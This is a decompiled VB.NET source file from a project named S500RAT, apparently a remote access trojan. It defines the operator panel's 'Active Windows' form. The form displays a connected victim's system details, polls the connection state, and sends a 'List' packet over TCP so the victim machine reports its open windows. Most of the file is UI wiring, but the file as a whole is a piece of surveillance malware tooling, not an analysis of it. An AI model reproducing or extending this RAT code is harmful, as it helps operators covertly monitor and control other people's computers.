Imports System
Imports System.ComponentModel
Imports System.Diagnostics
Imports System.Drawing
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
Imports Guna.UI2.WinForms
Imports Guna.UI2.WinForms.Enums
Imports MessagePackLib.MessagePack
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports S500RAT.Server.Connection
Imports Sunny.UI

Namespace S500RAT
	' Token: 0x02000039 RID: 57
	<DesignerGenerated()>
	Public Partial Class FormWindowsActive
		Inherits Form

		' Token: 0x06000FEE RID: 4078 RVA: 0x0008A22D File Offset: 0x0008842D
		Public Sub New()
			AddHandler MyBase.Load, AddressOf Me.FormWindowsActive_Load
			AddHandler MyBase.Resize, AddressOf Me.FormWindowsActive_Resize
			Me.FormSize = False
			Me.InitializeComponent()
		End Sub

		' Token: 0x17000680 RID: 1664
		' (get) Token: 0x06000FF1 RID: 4081 RVA: 0x0008B24A File Offset: 0x0008944A
		' (set) Token: 0x06000FF2 RID: 4082 RVA: 0x0008B254 File Offset: 0x00089454
		Friend Overridable Property ImageList1 As ImageList

		' Token: 0x17000681 RID: 1665
		' (get) Token: 0x06000FF3 RID: 4083 RVA: 0x0008B25D File Offset: 0x0008945D
		' (set) Token: 0x06000FF4 RID: 4084 RVA: 0x0008B268 File Offset: 0x00089468
		Friend Overridable Property Timer1 As System.Windows.Forms.Timer
			<CompilerGenerated()>
			Get
				Return Me._Timer1
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As System.Windows.Forms.Timer)
				Dim value2 As EventHandler = AddressOf Me.Timer1_Tick
				Dim timer As System.Windows.Forms.Timer = Me._Timer1
				If timer IsNot Nothing Then
					RemoveHandler timer.Tick, value2
				End If
				Me._Timer1 = value
				timer = Me._Timer1
				If timer IsNot Nothing Then
					AddHandler timer.Tick, value2
				End If
			End Set
		End Property

		' Token: 0x17000682 RID: 1666
		' (get) Token: 0x06000FF5 RID: 4085 RVA: 0x0008B2AB File Offset: 0x000894AB
		' (set) Token: 0x06000FF6 RID: 4086 RVA: 0x0008B2B5 File Offset: 0x000894B5
		Friend Overridable Property Guna2Elipse1 As Guna2Elipse

		' Token: 0x17000683 RID: 1667
		' (get) Token: 0x06000FF7 RID: 4087 RVA: 0x0008B2BE File Offset: 0x000894BE
		' (set) Token: 0x06000FF8 RID: 4088 RVA: 0x0008B2C8 File Offset: 0x000894C8
		Friend Overridable Property UiLabel1 As UILabel

		' Token: 0x17000684 RID: 1668
		' (get) Token: 0x06000FF9 RID: 4089 RVA: 0x0008B2D1 File Offset: 0x000894D1
		' (set) Token: 0x06000FFA RID: 4090 RVA: 0x0008B2DB File Offset: 0x000894DB
		Private Overridable Property ClientInfo As Label

		' Token: 0x17000685 RID: 1669
		' (get) Token: 0x06000FFB RID: 4091 RVA: 0x0008B2E4 File Offset: 0x000894E4
		' (set) Token: 0x06000FFC RID: 4092 RVA: 0x0008B2EE File Offset: 0x000894EE
		Public Overridable Property ActiveNum As Label

		' Token: 0x17000686 RID: 1670
		' (get) Token: 0x06000FFD RID: 4093 RVA: 0x0008B2F7 File Offset: 0x000894F7
		' (set) Token: 0x06000FFE RID: 4094 RVA: 0x0008B301 File Offset: 0x00089501
		Friend Overridable Property ListWindowsActive As Guna2DataGridView

		' Token: 0x17000687 RID: 1671
		' (get) Token: 0x06000FFF RID: 4095 RVA: 0x0008B30A File Offset: 0x0008950A
		' (set) Token: 0x06001000 RID: 4096 RVA: 0x0008B314 File Offset: 0x00089514
		Friend Overridable Property Guna2ResizeBox1 As Guna2ResizeBox

		' Token: 0x17000688 RID: 1672
		' (get) Token: 0x06001001 RID: 4097 RVA: 0x0008B31D File Offset: 0x0008951D
		' (set) Token: 0x06001002 RID: 4098 RVA: 0x0008B327 File Offset: 0x00089527
		Friend Overridable Property ControllContextMenuStrip As ContextMenuStrip

		' Token: 0x17000689 RID: 1673
		' (get) Token: 0x06001003 RID: 4099 RVA: 0x0008B330 File Offset: 0x00089530
		' (set) Token: 0x06001004 RID: 4100 RVA: 0x0008B33C File Offset: 0x0008953C
		Friend Overridable Property RefreshList As ToolStripMenuItem
			<CompilerGenerated()>
			Get
				Return Me._RefreshList
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ToolStripMenuItem)
				Dim value2 As EventHandler = AddressOf Me.RefreshList_Click
				Dim refreshList As ToolStripMenuItem = Me._RefreshList
				If refreshList IsNot Nothing Then
					RemoveHandler refreshList.Click, value2
				End If
				Me._RefreshList = value
				refreshList = Me._RefreshList
				If refreshList IsNot Nothing Then
					AddHandler refreshList.Click, value2
				End If
			End Set
		End Property

		' Token: 0x1700068A RID: 1674
		' (get) Token: 0x06001005 RID: 4101 RVA: 0x0008B37F File Offset: 0x0008957F
		' (set) Token: 0x06001006 RID: 4102 RVA: 0x0008B389 File Offset: 0x00089589
		Friend Overridable Property Column3 As DataGridViewImageColumn

		' Token: 0x1700068B RID: 1675
		' (get) Token: 0x06001007 RID: 4103 RVA: 0x0008B392 File Offset: 0x00089592
		' (set) Token: 0x06001008 RID: 4104 RVA: 0x0008B39C File Offset: 0x0008959C
		Friend Overridable Property Column4 As DataGridViewTextBoxColumn

		' Token: 0x1700068C RID: 1676
		' (get) Token: 0x06001009 RID: 4105 RVA: 0x0008B3A5 File Offset: 0x000895A5
		' (set) Token: 0x0600100A RID: 4106 RVA: 0x0008B3AF File Offset: 0x000895AF
		Friend Overridable Property Column1 As DataGridViewTextBoxColumn

		' Token: 0x1700068D RID: 1677
		' (get) Token: 0x0600100B RID: 4107 RVA: 0x0008B3B8 File Offset: 0x000895B8
		' (set) Token: 0x0600100C RID: 4108 RVA: 0x0008B3C2 File Offset: 0x000895C2
		Friend Overridable Property Mini As ValleyMini

		' Token: 0x1700068E RID: 1678
		' (get) Token: 0x0600100D RID: 4109 RVA: 0x0008B3CB File Offset: 0x000895CB
		' (set) Token: 0x0600100E RID: 4110 RVA: 0x0008B3D5 File Offset: 0x000895D5
		Friend Overridable Property MAX As ValleyMax

		' Token: 0x1700068F RID: 1679
		' (get) Token: 0x0600100F RID: 4111 RVA: 0x0008B3DE File Offset: 0x000895DE
		' (set) Token: 0x06001010 RID: 4112 RVA: 0x0008B3E8 File Offset: 0x000895E8
		Friend Overridable Property ExitForm As ValleyClose
			<CompilerGenerated()>
			Get
				Return Me._ExitForm
			End Get
			<CompilerGenerated()>
			<MethodImpl(MethodImplOptions.Synchronized)>
			Set(value As ValleyClose)
				Dim value2 As EventHandler = AddressOf Me.ExitForm_Click
				Dim exitForm As ValleyClose = Me._ExitForm
				If exitForm IsNot Nothing Then
					RemoveHandler exitForm.Click, value2
				End If
				Me._ExitForm = value
				exitForm = Me._ExitForm
				If exitForm IsNot Nothing Then
					AddHandler exitForm.Click, value2
				End If
			End Set
		End Property

		' Token: 0x17000690 RID: 1680
		' (get) Token: 0x06001011 RID: 4113 RVA: 0x0008B42B File Offset: 0x0008962B
		' (set) Token: 0x06001012 RID: 4114 RVA: 0x0008B435 File Offset: 0x00089635
		Friend Overridable Property Guna2DragControl1 As Guna2DragControl

		' Token: 0x17000691 RID: 1681
		' (get) Token: 0x06001013 RID: 4115 RVA: 0x0008B43E File Offset: 0x0008963E
		' (set) Token: 0x06001014 RID: 4116 RVA: 0x0008B448 File Offset: 0x00089648
		Friend Overridable Property Guna2BorderlessForm1 As Guna2BorderlessForm

		' Token: 0x17000692 RID: 1682
		' (get) Token: 0x06001015 RID: 4117 RVA: 0x0008B451 File Offset: 0x00089651
		' (set) Token: 0x06001016 RID: 4118 RVA: 0x0008B45B File Offset: 0x0008965B
		Public Property Client As Clients

		' Token: 0x17000693 RID: 1683
		' (get) Token: 0x06001017 RID: 4119 RVA: 0x0008B464 File Offset: 0x00089664
		' (set) Token: 0x06001018 RID: 4120 RVA: 0x0008B46E File Offset: 0x0008966E
		Public Property F As FormS500

		' Token: 0x17000694 RID: 1684
		' (get) Token: 0x06001019 RID: 4121 RVA: 0x0008B477 File Offset: 0x00089677
		' (set) Token: 0x0600101A RID: 4122 RVA: 0x0008B481 File Offset: 0x00089681
		Public Property FullPath As String

		' Token: 0x17000695 RID: 1685
		' (get) Token: 0x0600101B RID: 4123 RVA: 0x0008B48A File Offset: 0x0008968A
		' (set) Token: 0x0600101C RID: 4124 RVA: 0x0008B494 File Offset: 0x00089694
		Friend Property ParentClient As Clients

		' Token: 0x0600101D RID: 4125 RVA: 0x0008B4A0 File Offset: 0x000896A0
		Private Sub FormWindowsActive_Load(sender As Object, e As EventArgs)
			Me.ListWindowsActive.ColumnHeadersDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWindowsActive.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWindowsActive.AlternatingRowsDefaultCellStyle.BackColor = Color.FromArgb(26, 31, 55)
			Me.ListWindowsActive.AlternatingRowsDefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWindowsActive.DefaultCellStyle.BackColor = Color.FromArgb(7, 11, 48)
			Me.ListWindowsActive.DefaultCellStyle.ForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWindowsActive.DefaultCellStyle.SelectionBackColor = Color.FromArgb(47, 39, 134)
			Me.ListWindowsActive.DefaultCellStyle.SelectionForeColor = Color.FromArgb(255, 255, 255)
			Me.ListWindowsActive.CellBorderStyle = DataGridViewCellBorderStyle.None
			Dim expression As String = Conversions.ToString(RuntimeHelpers.GetObjectValue(DataB.InfoClient(Me.ParentClient.L)))
			Try
				Me.ClientInfo.Text = String.Concat(New String() { Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(1), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(2), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(3), " / ", Strings.Split(expression, "|'|", -1, CompareMethod.Binary)(4) })
			Catch ex As Exception
				Me.ClientInfo.Text = "Not found !"
			End Try
			Me.FormSize = True
			Me.MinimumSize = MyBase.Size
		End Sub

		' Token: 0x0600101E RID: 4126 RVA: 0x0008B694 File Offset: 0x00089894
		Private Sub Timer1_Tick(sender As Object, e As EventArgs)
			Try
				Dim flag As Boolean = Not Me.ParentClient.TcpClient.Connected OrElse Not Me.Client.TcpClient.Connected
				If flag Then
					MyBase.Close()
				End If
			Catch ex As Exception
				MyBase.Close()
			End Try
		End Sub

		' Token: 0x0600101F RID: 4127 RVA: 0x0008B700 File Offset: 0x00089900
		Private Sub ExitForm_Click(sender As Object, e As EventArgs)
			ThreadPool.QueueUserWorkItem(Sub(o As Object)
				Dim client As Clients = Me.Client
				If client IsNot Nothing Then
					client.Disconnected()
				End If
				MyBase.Close()
			End Sub)
		End Sub

		' Token: 0x06001020 RID: 4128 RVA: 0x0008B718 File Offset: 0x00089918
		Private Sub FormWindowsActive_Resize(sender As Object, e As EventArgs)
			Dim flag As Boolean = Not Me.FormSize
			If flag Then
				Dim width As Integer = Screen.PrimaryScreen.Bounds.Width
				Dim height As Integer = Screen.PrimaryScreen.Bounds.Height
				Dim width2 As Integer = MyBase.Width
				Dim height2 As Integer = MyBase.Height
				Dim x As Integer = CInt(Math.Round(CDbl((width - width2)) / 2.0))
				Dim y As Integer = CInt(Math.Round(CDbl((height - height2)) / 2.0))
				MyBase.Location = New Point(x, y)
			End If
		End Sub

		' Token: 0x06001021 RID: 4129 RVA: 0x0008B7AC File Offset: 0x000899AC
		Private Sub RefreshList_Click(sender As Object, e As EventArgs)
			Dim msgPack As MsgPack = New MsgPack()
			msgPack.ForcePathObject("Packet").AsString = "List"
			ThreadPool.QueueUserWorkItem(AddressOf Me.Client.SendByte, msgPack.Encode2Bytes())
		End Sub

		' Token: 0x0400073B RID: 1851
		Private FormSize As Boolean
	End Class
End Namespace
